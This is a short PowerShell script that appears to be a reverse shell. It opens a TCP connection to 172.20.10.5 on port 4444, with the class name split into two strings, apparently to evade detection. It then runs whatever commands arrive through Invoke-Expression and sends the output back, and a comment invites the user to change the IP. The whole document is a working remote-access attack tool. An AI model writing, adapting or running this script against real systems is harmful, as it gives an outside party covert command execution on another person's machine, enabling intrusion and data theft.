$a = "System.Net.Sockets."
$b = "TCPClient"
$c = New-Object ($a + $b)("172.20.10.5", 4444) # Change IP if needed
$s = $c.GetStream()

[byte[]]$b_arr = 0..65535|%{0}
$m = ([text.encoding]::ASCII).GetBytes("CONNECTED`nPS " + (pwd).Path + "> ")
$s.Write($m,0,$m.Length)

while(($i = $s.Read($b_arr, 0, $b_arr.Length)) -ne 0){
    $d = [text.encoding]::ASCII.GetString($b_arr,0, $i)
    try { 
        $sb = (Invoke-Expression $d 2>&1 | Out-String) 
    } catch { 
        $sb = $_.Exception.Message 
    }
    $out = $sb + "PS " + (pwd).Path + "> "
    $m = ([text.encoding]::ASCII).GetBytes($out)
    $s.Write($m,0,$m.Length)
    $s.Flush()
}
$c.Close()
